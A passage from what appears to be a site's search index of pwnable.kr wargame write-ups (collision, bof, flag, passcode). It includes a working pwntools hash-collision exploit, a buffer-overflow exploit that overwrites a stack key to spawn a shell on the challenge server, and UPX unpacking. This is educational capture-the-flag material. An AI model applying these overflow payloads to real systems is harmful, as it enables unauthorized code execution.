ra@moni~/P/pwnable.kr&gt; cat col-exploit.py from pwn import * data=p32(0x6c5cec8)*4+p32(0x6c5cecc) remote = ssh('col' ,'128.61.240.205' ,password='guest', port=2222) program = remote.process(executable='./col', argv=['col',data]) flag = program.recv() log.success(\"Flag: \" + flag) program.close() remote.close()   Lets try our final exploit   ra@moni~/P/pwnable.kr&gt; python col-exploit.py [+] Connecting to 128.61.240.205 on port 2222: Done [*] col@128.61.240.205:     Distro    Ubuntu 16.04     OS:       linux     Arch:     amd64     Version:  4.4.179     ASLR:     Enabled [+] Starting remote process u'./col' on 128.61.240.205: pid 428418 [+] Flag: daddy! I just managed to create a hash collision :) [*] Stopped remote process u'col' on 128.61.240.205 (pid 428418) [*] Closed connection to '128.61.240.205'   Done! Our flag is,   Flag: daddy! I just managed to create a hash collision :)   ","categories": ["Pwn"],
        "tags": [],
        "url": "http://localhost:4000/pwn/2-collision/",
        "teaser": "http://localhost:4000/assets/images/pwn/pwn.png"
      },{
        "title": "pwnable.kr - bof",
        "excerpt":"Given two files to download   Binary   Source Code   Lets list our files,   ra@moni~/P/p/bof&gt; ls -la total 24 drwxrwxr-x 2 ra ra 4096 Jun  2 16:08 ./ drwxrwxr-x 5 ra ra 4096 Jun  2 16:04 ../ -rw-rw-r-- 1 ra ra 7348 Jun  2 16:08 bof -rw-rw-r-- 1 ra ra  308 Jun  2 16:08 bof.c -rw-rw-r-- 1 ra ra  126 Jun  2 16:09 bof.md   Lets check our binary file type using file command   ra@moni~/P/p/bof&gt; file bof bof: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ed643dfe8d026b7238d3033b0d0bcc499504f273, not stripped   The source code of the binary file is,   #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; void func(int key){ \tchar overflowme[32]; \tprintf(\"overflow me : \"); \tgets(overflowme);\t// smash me! \tif(key == 0xcafebabe){ \t\tsystem(\"/bin/sh\"); \t} \telse{ \t\tprintf(\"Nah..\\n\"); \t} } int main(int argc, char* argv[]){ \tfunc(0xdeadbeef); \treturn 0; }   Now lets try playing with our binary,   ra@moni~/P/p/bof&gt; ./bof fish: The file “./bof” is not executable by this user ra@moni~/P/p/bof&gt; chmod +x bof ra@moni~/P/p/bof&gt; ./bof overflow me : deadbeef Nah..   So, it is expecting some different input from us   Lets observe the given binary,           It has two functions main() and func()            main() only calls func()            The flow of whole binary depends on func()            The func() checks the key value            If key is equal to 0xcafebabe then it spwans a shell            Else it displays an error message            But, already func() is loaded with key in main() like func(0xdeadbeef)       So we have to perform a “OVERFLOW”     Our binary uses gets() from #include &lt;string.h&gt;   It is possible to perform “BUFFER OVERFLOW” on gets(), since it is a vulnerable function   Lets try to crash our program,   ra@moni~/P/p/bof&gt; ./bof overflow me : AAAAAAAAAAAAAAAAAAAAAAAAAAA Nah.. ra@moni~/P/p/bof&gt; ./bof overflow me : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Nah.. *** stack smashing detected ***: terminated fish: “./bof” terminated by signal SIGABRT (Abort)   So we can perform “OVERFLOW” in this binary   Lets check the security mitigations of this binary,   ra@moni~/P/p/bof&gt; checksec ./bof [*] '/home/ra/PWNPractice/pwnable.kr/bof/bof'     Arch:     i386-32-little     RELRO:    Partial RELRO     Stack:    Canary found     NX:       NX enabled     PIE:      PIE enabled     Lets disassemble our program using debugger   Disassembling main()   pwndbg&gt; disassemble main Dump of assembler code for function main:    0x0000068a &lt;+0&gt;:\tpush   ebp    0x0000068b &lt;+1&gt;:\tmov    ebp,esp    0x0000068d &lt;+3&gt;:\tand    esp,0xfffffff0    0x00000690 &lt;+6&gt;:\tsub    esp,0x10    0x00000693 &lt;+9&gt;:\tmov    DWORD PTR [esp],0xdeadbeef    0x0000069a &lt;+16&gt;:\tcall   0x62c &lt;func&gt;    0x0000069f &lt;+21&gt;:\tmov    eax,0x0    0x000006a4 &lt;+26&gt;:\tleave    0x000006a5 &lt;+27&gt;:\tret End of assembler dump.   Disassembling func()   pwndbg&gt; disassemble func Dump of assembler code for function func:    0x0000062c &lt;+0&gt;:\tpush   ebp    0x0000062d &lt;+1&gt;:\tmov    ebp,esp    0x0000062f &lt;+3&gt;:\tsub    esp,0x48    0x00000632 &lt;+6&gt;:\tmov    eax,gs:0x14    0x00000638 &lt;+12&gt;:\tmov    DWORD PTR [ebp-0xc],eax    0x0000063b &lt;+15&gt;:\txor    eax,eax    0x0000063d &lt;+17&gt;:\tmov    DWORD PTR [esp],0x78c    0x00000644 &lt;+24&gt;:\tcall   0x645 &lt;func+25&gt;    0x00000649 &lt;+29&gt;:\tlea    eax,[ebp-0x2c]    0x0000064c &lt;+32&gt;:\tmov    DWORD PTR [esp],eax    0x0000064f &lt;+35&gt;:\tcall   0x650 &lt;func+36&gt;    0x00000654 &lt;+40&gt;:\tcmp    DWORD PTR [ebp+0x8],0xcafebabe    0x0000065b &lt;+47&gt;:\tjne    0x66b &lt;func+63&gt;    0x0000065d &lt;+49&gt;:\tmov    DWORD PTR [esp],0x79b    0x00000664 &lt;+56&gt;:\tcall   0x665 &lt;func+57&gt;    0x00000669 &lt;+61&gt;:\tjmp    0x677 &lt;func+75&gt;    0x0000066b &lt;+63&gt;:\tmov    DWORD PTR [esp],0x7a3    0x00000672 &lt;+70&gt;:\tcall   0x673 &lt;func+71&gt;    0x00000677 &lt;+75&gt;:\tmov    eax,DWORD PTR [ebp-0xc]    0x0000067a &lt;+78&gt;:\txor    eax,DWORD PTR gs:0x14    0x00000681 &lt;+85&gt;:\tje     0x688 &lt;func+92&gt;    0x00000683 &lt;+87&gt;:\tcall   0x684 &lt;func+88&gt;    0x00000688 &lt;+92&gt;:\tleave    0x00000689 &lt;+93&gt;:\tret End of assembler dump.   Now, here is the interesting part in this func() function      0x00000654 &lt;+40&gt;:\tcmp    DWORD PTR [ebp+0x8],0xcafebabe   So the value 0xdeadbeef will be in the stack memory, we just need to replace the value with  0xcafebabe by overflow   So lets test it with some dummy input and find the offset of 0xdeadbeef from overflowme   Lets set the breakpoints and pass inputs to analyze,   Go for main() first,   pwndbg&gt; disassemble main Dump of assembler code for function main:    0x0000068a &lt;+0&gt;:\tpush   ebp    0x0000068b &lt;+1&gt;:\tmov    ebp,esp    0x0000068d &lt;+3&gt;:\tand    esp,0xfffffff0    0x00000690 &lt;+6&gt;:\tsub    esp,0x10    0x00000693 &lt;+9&gt;:\tmov    DWORD PTR [esp],0xdeadbeef    0x0000069a &lt;+16&gt;:\tcall   0x62c &lt;func&gt;    0x0000069f &lt;+21&gt;:\tmov    eax,0x0    0x000006a4 &lt;+26&gt;:\tleave    0x000006a5 &lt;+27&gt;:\tret End of assembler dump. pwndbg&gt; b *main Breakpoint 1 at 0x68a   Now start the program,   pwndbg&gt; r Starting program: /home/ra/PWNPractice/pwnable.kr/bof/bof  Breakpoint 1, 0x5655568a in main () LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA ───────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────  EAX  0xf7fa9808 (environ) —▸ 0xffffd89c —▸ 0xffffda4e ◂— 'ALACRITTY_LOG=/tmp/Alacritty-34408.log'  EBX  0x0  ECX  0x8e86f40a  EDX  0xffffd824 ◂— 0x0  EDI  0xf7fa7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c  ESI  0xf7fa7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c  EBP  0x0  ESP  0xffffd7fc —▸ 0xf7ddaee5 (__libc_start_main+245) ◂— add    esp, 0x10  EIP  0x5655568a (main) ◂— push   ebp ─────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────  ► 0x5655568a &lt;main&gt;       push   ebp    0x5655568b &lt;main+1&gt;     mov    ebp, esp    0x5655568d &lt;main+3&gt;     and    esp, 0xfffffff0    0x56555690 &lt;main+6&gt;     sub    esp, 0x10    0x56555693 &lt;main+9&gt;     mov    dword ptr [esp], 0xdeadbeef    0x5655569a &lt;main+16&gt;    call   func &lt;func&gt;     0x5655569f &lt;main+21&gt;    mov    eax, 0    0x565556a4 &lt;main+26&gt;    leave    0x565556a5 &lt;main+27&gt;    ret     0x565556a6              nop    0x565556a7              nop ─────────────────────────────────────────────[ STACK ]────────────────────────────────────────────── 00:0000│ esp 0xffffd7fc —▸ 0xf7ddaee5 (__libc_start_main+245) ◂— add    esp, 0x10 01:0004│     0xffffd800 ◂— 0x1 02:0008│     0xffffd804 —▸ 0xffffd894 —▸ 0xffffda26 ◂— '/home/ra/PWNPractice/pwnable.kr/bof/bof' 03:000c│     0xffffd808 —▸ 0xffffd89c —▸ 0xffffda4e ◂— 'ALACRITTY_LOG=/tmp/Alacritty-34408.log' 04:0010│     0xffffd80c —▸ 0xffffd824 ◂— 0x0 05:0014│     0xffffd810 —▸ 0xf7fa7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c 06:0018│     0xffffd814 ◂— 0x0 07:001c│     0xffffd818 —▸ 0xffffd878 —▸ 0xffffd894 —▸ 0xffffda26 ◂— '/home/ra/PWNPractice/pwnable.kr/bof/bof' ───────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────  ► f 0 0x5655568a main    f 1 0xf7ddaee5 __libc_start_main+245 ────────────────────────────────────────────────────────────────────────────────────────────────────    After running the program,   pwndbg&gt; disassemble func Dump of assembler code for function func:    0x5655562c &lt;+0&gt;:\tpush   ebp    0x5655562d &lt;+1&gt;:\tmov    ebp,esp    0x5655562f &lt;+3&gt;:\tsub    esp,0x48    0x56555632 &lt;+6&gt;:\tmov    eax,gs:0x14    0x56555638 &lt;+12&gt;:\tmov    DWORD PTR [ebp-0xc],eax    0x5655563b &lt;+15&gt;:\txor    eax,eax    0x5655563d &lt;+17&gt;:\tmov    DWORD PTR [esp],0x5655578c    0x56555644 &lt;+24&gt;:\tcall   0xf7e2dcd0 &lt;__GI__IO_puts&gt;    0x56555649 &lt;+29&gt;:\tlea    eax,[ebp-0x2c]    0x5655564c &lt;+32&gt;:\tmov    DWORD PTR [esp],eax    0x5655564f &lt;+35&gt;:\tcall   0xf7e2d1b0 &lt;_IO_gets&gt;    0x56555654 &lt;+40&gt;:\tcmp    DWORD PTR [ebp+0x8],0xcafebabe    0x5655565b &lt;+47&gt;:\tjne    0x5655566b &lt;func+63&gt;    0x5655565d &lt;+49&gt;:\tmov    DWORD PTR [esp],0x5655579b    0x56555664 &lt;+56&gt;:\tcall   0xf7e01830 &lt;__libc_system&gt;    0x56555669 &lt;+61&gt;:\tjmp    0x56555677 &lt;func+75&gt;    0x5655566b &lt;+63&gt;:\tmov    DWORD PTR [esp],0x565557a3    0x56555672 &lt;+70&gt;:\tcall   0xf7e2dcd0 &lt;__GI__IO_puts&gt;    0x56555677 &lt;+75&gt;:\tmov    eax,DWORD PTR [ebp-0xc]    0x5655567a &lt;+78&gt;:\txor    eax,DWORD PTR gs:0x14    0x56555681 &lt;+85&gt;:\tje     0x56555688 &lt;func+92&gt;    0x56555683 &lt;+87&gt;:\tcall   0xf7ed44e0 &lt;__stack_chk_fail&gt;    0x56555688 &lt;+92&gt;:\tleave    0x56555689 &lt;+93&gt;:\tret End of assembler dump. pwndbg&gt; b *0x56555654 Breakpoint 2 at 0x56555654   Now lets continue our program, until the “compare logic”   Lets pass our inputs,   pwndbg&gt; c Continuing. overflow me : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  Breakpoint 2, 0x56555654 in func () LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA ───────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────── *EAX  0xffffd7ac ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'  EBX  0x0 *ECX  0xf7fa7580 (_IO_2_1_stdin_) ◂— 0xfbad2288 *EDX  0xffffd7df ◂— 0xadbeef00  EDI  0xf7fa7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c  ESI  0xf7fa7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c *EBP  0xffffd7d8 ◂— 'AAAAAAA' *ESP  0xffffd790 —▸ 0xffffd7ac ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' *EIP  0x56555654 (func+40) ◂— cmp    dword ptr [ebp + 8], 0xcafebabe ─────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────  ► 0x56555654 &lt;func+40&gt;    cmp    dword ptr [ebp + 8], 0xcafebabe    0x5655565b &lt;func+47&gt;    jne    func+63 &lt;func+63&gt;     ↓    0x5655566b &lt;func+63&gt;    mov    dword ptr [esp], 0x565557a3    0x56555672 &lt;func+70&gt;    call   puts &lt;puts&gt;     0x56555677 &lt;func+75&gt;    mov    eax, dword ptr [ebp - 0xc]    0x5655567a &lt;func+78&gt;    xor    eax, dword ptr gs:[0x14]    0x56555681 &lt;func+85&gt;    je     func+92 &lt;func+92&gt;     0x56555683 &lt;func+87&gt;    call   __stack_chk_fail &lt;__stack_chk_fail&gt;     0x56555688 &lt;func+92&gt;    leave    0x56555689 &lt;func+93&gt;    ret     0x5655568a &lt;main&gt;       push   ebp ─────────────────────────────────────────────[ STACK ]────────────────────────────────────────────── 00:0000│ esp 0xffffd790 —▸ 0xffffd7ac ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' 01:0004│     0xffffd794 ◂— 0x534 02:0008│     0xffffd798 ◂— 0x9e 03:000c│     0xffffd79c —▸ 0xf7fa5a80 (__dso_handle) ◂— 0xf7fa5a80 04:0010│     0xffffd7a0 ◂— 0x0 05:0014│     0xffffd7a4 —▸ 0xf7fa7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c 06:0018│     0xffffd7a8 —▸ 0xf7ffc7e0 (_rtld_global_ro) ◂— 0x0 07:001c│ eax 0xffffd7ac ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' ───────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────  ► f 0 0x56555654 func+40    f 1 0x414141    f 2 0xdeadbeef    f 3      0x0 ────────────────────────────────────────────────────────────────────────────────────────────────────    Lets view our stack values in memory,   pwndbg&gt; x/50wx $esp 0xffffd790:\t0xffffd7ac\t0x00000534\t0x0000009e\t0xf7fa5a80 0xffffd7a0:\t0x00000000\t0xf7fa7000\t0xf7ffc7e0\t0x41414141 0xffffd7b0:\t0x41414141\t0x41414141\t0x41414141\t0x41414141 0xffffd7c0:\t0x41414141\t0x41414141\t0x41414141\t0x41414141 0xffffd7d0:\t0x41414141\t0x41414141\t0x41414141\t0x00414141 0xffffd7e0:\t0xdeadbeef\t0x00000000\t0x565556b9\t0x00000000 0xffffd7f0:\t0xf7fa7000\t0xf7fa7000\t0x00000000\t0xf7ddaee5 0xffffd800:\t0x00000001\t0xffffd894\t0xffffd89c\t0xffffd824 0xffffd810:\t0xf7fa7000\t0x00000000\t0xffffd878\t0x00000000 0xffffd820:\t0xf7ffd000\t0x00000000\t0xf7fa7000\t0xf7fa7000 0xffffd830:\t0x00000000\t0x8e7f65c4\t0xca9223d4\t0x00000000 0xffffd840:\t0x00000000\t0x00000000\t0x00000001\t0x56555530 0xffffd850:\t0x00000000\t0xf7fe7b24   We can clearly see that,   0xffffd7e0 has 0xdeadbeef   Our buffer starts after 0xffffd7a0+ 12 bytes = 0xffffd7ab   Lets find the offset of the 0xdeadbeef data,    Offset distance can be given by,  ```c &gt;&gt;&gt; hex(0xffffd7e0-0xffffd7ac) '0x34' &gt;&gt;&gt; print(0x34) 52   So 0xdeadbeef comes after 52 bytes of buffer   If we can overwrite 0xdeadbeef with 0xcafebabe, a shell will be opened     Now, lets try to exploit the program locally using pwntools   ra@moni~/P/p/bof&gt; cat exploit.py #!/usr/bin/python from pwn import * buf=\"\" buf+=\"A\"*52 buf+=p32(0xcafebabe) host=\"128.61.240.205\" port=9000 #p=remote(host,port) p=process('./bof') p.send(buf) p.interactive()   By running this exploit   ra@moni~/P/p/bof&gt; python exploit.py [+] Starting local process './bof': pid 36634 [*] Switching to interactive mode  $ $ whoami ra $ [*] Interrupted [*] Stopped process './bof' (pid 36634)   Other way to exploit by piping,   ra@moni:~/PWNPractice/pwnable.kr/bof$ (python -c \"print('A'*52+'\\xbe\\xba\\xfe\\xca')\";cat) | ./bof overflow me : whoami ra ls bof  bof.c  bof.md  exploit.py echo \"OVERFLOW\" OVERFLOW    Now lets try to exploit this on server,   ra@moni:~/PWNPractice/pwnable.kr/bof$ python -c \"print('A'*52+'\\xbe\\xba\\xfe\\xca')\" &gt; exploitdata ra@moni:~/PWNPractice/pwnable.kr/bof$ cat exploitdata AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�                                                      ra@moni:~/PWNPractice/pwnable.kr/bof$ ^C ra@moni:~/PWNPractice/pwnable.kr/bof$ (cat exploitdata ;cat) | ./bof overflow me : ls bof  bof.c  bof.md  exploitdata  exploit.py ^C*** stack smashing detected ***: terminated Aborted (core dumped)  ra@moni:~/PWNPractice/pwnable.kr/bof$  Now lets try it,   ra@moni:~/PWNPractice/pwnable.kr/bof$ (cat exploitdata ;cat)| nc 128.61.240.205 9000 overflow me : whoami bof cat flag daddy, I just pwned a buFFer :)   Lets do with pwntools   ra@moni~/P/p/bof&gt; cat exploit.py #!/usr/bin/python from pwn import * buf=\"\" buf+=\"A\"*52 buf+=p32(0xcafebabe) host=\"128.61.240.205\" port=9000 p=remote(host,port) #p=process('./bof') p.send(buf) p.interactive()   Trying it,   ra@moni~/P/p/bof&gt; python3 test.py [+] Opening connection to 128.61.240.205 on port 9000: Done [*] Switching to interactive mode $ whoami $ whoami bof $ cat flag daddy, I just pwned a buFFer :)   Done! we got the flag   Flag: daddy, I just pwned a buFFer :)   ","categories": ["Pwn"],
        "tags": ["buffer overflow"],
        "url": "http://localhost:4000/pwn/3-bof/",
        "teaser": "http://localhost:4000/assets/images/pwn/pwn.png"
      },{
        "title": "pwnable.kr - flag",
        "excerpt":"Download the Binary   It is said that this is a simple reversing task   Lets list the files,   ra@moni~/P/p/flag&gt; ls -la total 340 drwxrwxr-x 2 ra ra   4096 Jun  3 09:37 ./ drwxrwxr-x 6 ra ra   4096 Jun  3 09:36 ../ -rw-rw-r-- 1 ra ra 335288 May 16  2019 flag -rw-rw-r-- 1 ra ra    120 Jun  3 09:38 flag.md   Now lets check the file type using file command,   ra@moni~/P/p/flag&gt; file flag flag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header   So it is a stripped binary   By using strings we can see whether there is any ASCII or Unicode strings in it or not,   But it is a lot for this binary   Lets try running this binary,   ra@moni~/P/p/flag&gt; ./flag fish: The file “./flag” is not executable by this user ra@moni~/P/p/flag&gt; chmod +x flag ra@moni~/P/p/flag&gt; ./flag I will malloc() and strcpy the flag there. take it.   Its time for debugger,   ra@moni~/P/p/flag&gt; gdb ./flag GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2 Copyright (C) 2020 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt; This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Type \"show copying\" and \"show warranty\" for details. This GDB was configured as \"x86_64-linux-gnu\". Type \"show configuration\" for configuration details. For bug reporting instructions, please see: &lt;http://www.gnu.org/software/gdb/bugs/&gt;. Find the GDB manual and other documentation resources online at:     &lt;http://www.gnu.org/software/gdb/documentation/&gt;.  For help, type \"help\". Type \"apropos word\" to search for commands related to \"word\"... pwndbg: loaded 194 commands. Type pwndbg [filter] for a list. pwndbg: created $rebase, $ida gdb functions (can be used with print/break) Reading symbols from ./flag... (No debugging symbols found in ./flag) pwndbg&gt; info functions All defined functions: pwndbg&gt; disassemble main No symbol table is loaded.  Use the \"file\" command.   Since it is a stripped binary we cannot see any symbols in it   So i did more digging with strings   ra@moni~/P/p/flag&gt; strings flag | grep flag mthNflag ra@moni~/P/p/flag&gt; strings -10 flag '''' (0h''''HPX` np!f@(Q[uIB(0Tc Is\\AQ9@&amp;9;0 |&gt;_ g(o0|y *94D@yq\t9j DEo0?^ T3\txF5 D+Hf]X)J(~ ` 3n&lt;_t6&lt;-t2&lt;.t. ^'oxMlqM|M %!,L98v(&gt;F  ^=9X~\"1[p wwu62#}w\"I\t !&lt;/x\tdSt62A DUt]c[y;\"Z ps0/(HTDsxb d\"; Ut;IZ, FFFF|vpjFFFFd^XR 9.Q_q_:\t!m B like a de vic$:)oI wi{3{ oc()VjHtrcpV _STDERR_U4 ^0HMdZp)-&gt;? &amp; 0+03 `*r(])iP!ph ?0v[2*i+3]U m0\"|| / (GDU ]15QQen\",p ?../:deps/x86_64 ck_worYd$6 6@?GCONVFTH F_DIRlOSpIASE ?_OUTPU1YNAMIC_WEAK _~SO/IEC 14652 i18n FDC  !\"#$%&amp;'() *+,-./0&gt;3x6789:;&lt;=&gt;? @ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_ `abcdefghijklmnopqrstuvwxyz{|}~ C`.usr/sJe/ -c+21474836 la.HfB[-1] ANSI_X3.4&amp;968//T ;][tpVt8isT [{\"=q\"q ,(0t\\Q p_9ILP32_OFF : O_CREATE 'k$~[9]-&gt;d D 0no*RRx_ #J?3O2ABI NCYL 5GSCO0 -10 6/UCS4/H ,$PZT(ALJ7 -4LE/SleWle[u% LEPHONiASU2  \"9999$%&amp;/999956799999:&lt;DG9999HI_` #6''''&lt;dej''''k  ''''!#$`''''abcd''''efgh''''ijkl''''mnop''''qrst''''uvwx''''yz{|''''}~ 't*uv#oWCa Q2R''''STUV''''WXYZ''''[\\]^''''_ MNONNNNPRTUNNNNVWYZNNNN[\\_`NNNNabcdNNNNefhi  rrrr!\"#$rrrr%&amp;'(rrrr)*+,rrrr-./0rrrr1234rrrr5678rrrr9;&lt;=rrrr&gt;@ABrrrrCDFJrrrrKLMNrrrrOPRSrrrrTUVWrrrrXYZ[rrrr\\]^_rrrr`abcrrrrdefgrrrrhijkrrrrlmnorrrrpqrsrrrrtuvwrrrrxyz{rrrr|}~  !\"9999#$%&amp;9999'()*9999+,-.9999/012999934569999789:9999;&lt;=&gt;9999?@AB9999CDEF9999GHIJ9999KLMN9999OPQR9999STUV9999WXYZ9999[\\]^9999_`ab9999cdef9999ghij9999klmn9999opqr9999stuv9999wxyz9999{|}~9999 '12Wr%W345%Wr%67x!Wr892 b'cdr%WrefgWr%Whij%Wr%klr%WrmnoWr%Wpqr%Wr%str%WruvwWr%Wxyz%Wr%ABr%WrCDEWr%WFGH%Wr%IJr%WrKLMWr%WNOP%Wr%QRr%WrSTUWr%WVWX%Wr%YZ _r%W;k'MGEp%WTu Fri.at7day= pchuilqesyuustuw  $9999(/6&gt;9999HQXa9999eimq9999uy} Vng1XENIX# &amp;9223372036854775807L` &lt;http://w( PROT_EXEC|PROT_WRITE failed. $Info: This file is packed with the UPX executable packer http://upx.sf.net $ $Id: UPX 3.08 Copyright (C) 1996-2011 the UPX Team. All Rights Reserved. $ /proc/self/exe GCC: (Ubuntu/Linaro 4.6.3-1u)# ild-id$rela.plt __libc_f8e g?ojxS*/?8/ OT/?d''''[ /p#o]/P8vQj call_gmon_start DEH_FRAME_BEGINf @pleted.6036 curi,cntrSd |85408.mLm afKjump_`B` _PRETTY_FUNCT0Na @#1{59#3a%[ .&lt;e;5wdP9H* ~|2adDdoJs;0 C_&gt;YPE/NUMERIC? &lt;tbltoCto? mkpl'GLOBAL_O, I^Mx868uA8\"k F \tsa\t WUH   And here is some interesting part from the strings -10 flag output,   $Info: This file is packed with the UPX executable packer http://upx.sf.net $ $Id: UPX 3.08 Copyright (C) 1996-2011 the UPX Team. All Rights Reserved. $   It gives us some info that this stripped binary is being packed by UPX   So we should use UPX to unpack it   More on UPX,   https://en.wikipedia.org/wiki/UPX   https://upx.github.io/     We know that this binary is being packed by UPX,   Now lets install UPX   ra@moni~/P/p/flag&gt; sudo apt install upx [sudo] password for ra: Reading package lists... Done Building dependency tree Reading state information... Done Note, selecting 'upx-ucl' instead of 'upx' The following additional packages will be installed:   libucl1 The following NEW packages will be installed:   libucl1 upx-ucl 0 upgraded, 2 newly installed, 0 to remove and 46 not upgraded. Need to get 417 kB of archives. After this operation, 2,158 kB of additional disk space will be used. Do you want to continue? [Y/n] Get:1 http://in.archive.ubuntu.com/ubuntu focal/universe amd64 libucl1 amd64 1.03+repack-5 [25.0 kB] Get:2 http://in.archive.ubuntu.com/ubuntu focal/universe amd64 upx-ucl amd64 3.95-2build1 [392 kB] Fetched 417 kB in 1s (288 kB/s) Selecting previously unselected package libucl1:amd64. (Reading database ... 339326 files and directories currently installed.) Preparing to unpack .../libucl1_1.03+repack-5_amd64.deb ... Unpacking libucl1:amd64 (1.03+repack-5) ... Selecting previously unselected package upx-ucl. Preparing to unpack .../upx-ucl_3.95-2build1_amd64.deb ... Unpacking upx-ucl (3.95-2build1) ... Setting up libucl1:amd64 (1.03+repack-5) ... Setting up upx-ucl (3.95-2build1) ... update-alternatives: error: no alternatives for upx update-alternatives: using /usr/bin/upx-ucl to provide /usr/bin/upx (upx) in auto mode Processing triggers for man-db (2.9.1-1) ... Processing triggers for libc-bin (2.31-0ubuntu9.2) ...  Its time to unpack this binary,   ra@moni~/P/p/flag&gt; which upx /usr/bin/upx ra@moni~/P/p/flag&gt; upx -d flag                        Ultimate Packer for eXecutables                           Copyright (C) 1996 - 2018 UPX 3.95        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Aug 26th 2018          File size         Ratio      Format      Name    --------------------   ------   -----------   -----------     883745 &lt;-    335288   37.94%   linux/amd64   flag  Unpacked 1 file.   Now lets check the file type using file command,   ra@moni~/P/p/flag&gt; file flag flag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=96ec4cc272aeb383bd9ed26c0d4ac0eb5db41b16, not stripped   Yeah! Our packed stripped binary became not stripped binary   Now we can easily analyze it with our debuggers     Opening our decompressed binary in debugger,   Disassembling main()   pwndbg&gt; disassemble main Dump of assembler code for function main:    0x0000000000401164 &lt;+0&gt;:\tpush   rbp    0x0000000000401165 &lt;+1&gt;:\tmov    rbp,rsp    0x0000000000401168 &lt;+4&gt;:\tsub    rsp,0x10    0x000000000040116c &lt;+8&gt;:\tmov    edi,0x496658    0x0000000000401171 &lt;+13&gt;:\tcall   0x402080 &lt;puts&gt;    0x0000000000401176 &lt;+18&gt;:\tmov    edi,0x64    0x000000000040117b &lt;+23&gt;:\tcall   0x4099d0 &lt;malloc&gt;    0x0000000000401180 &lt;+28&gt;:\tmov    QWORD PTR [rbp-0x8],rax    0x0000000000401184 &lt;+32&gt;:\tmov    rdx,QWORD PTR [rip+0x2c0ee5]        # 0x6c2070 &lt;flag&gt;    0x000000000040118b &lt;+39&gt;:\tmov    rax,QWORD PTR [rbp-0x8]    0x000000000040118f &lt;+43&gt;:\tmov    rsi,rdx    0x0000000000401192 &lt;+46&gt;:\tmov    rdi,rax    0x0000000000401195 &lt;+49&gt;:\tcall   0x400320    0x000000000040119a &lt;+54&gt;:\tmov    eax,0x0    0x000000000040119f &lt;+59&gt;:\tleave    0x00000000004011a0 &lt;+60&gt;:\tret End of assembler dump.   It looks like we got our flag from the comment which is being loaded into rdx,   pwndbg&gt; x/s 0x6c2070 0x6c2070 &lt;flag&gt;:\t\"(fI\" pwndbg&gt; x/s *0x6c2070 0x496628:\t\"UPX...? sounds like a delivery service :)\"  Done! we got our flag,   Flag: UPX...? sounds like a delivery service :)   ","categories": ["Pwn"],
        "tags": ["packers"],
        "url": "http://localhost:4000/pwn/1-flag/",
        "teaser": "http://localhost:4000/assets/images/pwn/pwn.png"
      },{
        "title": "pwnable.kr - passcode",
        "excerpt":"Lets connect to our server,   ra@moni~&gt; ssh passcode@128.61.240.205 -p 2222 passcode@128.61.240.205's password:  ____  __    __  ____    ____  ____   _        ___      __  _  ____ |    \\|  |__|  ||    \\  /    ||    \\ | |      /  _]    |  |/ ]|    \\ |  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  ) |   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \\ |    / |  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \\|    \\ |  |   \\      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \\ |__|    \\_/\\_/  |__|__||__|__||_____||_____||_____||__||__|\\_||__|\\_|  - Site admin : daehee87@gatech.edu - IRC : irc.netgarage.org:6667 / #pwnable.kr - Simply type \"irssi\" command to join IRC now - files under /tmp can be erased anytime. make your directory under /tmp - to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal You have mail. Last login: Thu Jun  3 00:51:20 2021 from 49.205.152.1 passcode@pwnable:~$   Listing our files using ls -la,   passcode@pwnable:~$ ls -la total 36 drwxr-x---   5 root passcode     4096 Oct 23  2016 . drwxr-xr-x 115 root root         4096 Dec 22 08:10 .. d---------   2 root root         4096 Jun 26  2014 .bash_history -r--r-----   1 root passcode_pwn   48 Jun 26  2014 flag dr-xr-xr-x   2 root root         4096 Aug 20  2014 .irssi -r-xr-sr-x   1 root passcode_pwn 7485 Jun 26  2014 passcode -rw-r--r--   1 root root          858 Jun 26  2014 passcode.c drwxr-xr-x   2 root root         4096 Oct 23  2016 .pwntools-cache   We can see there are some 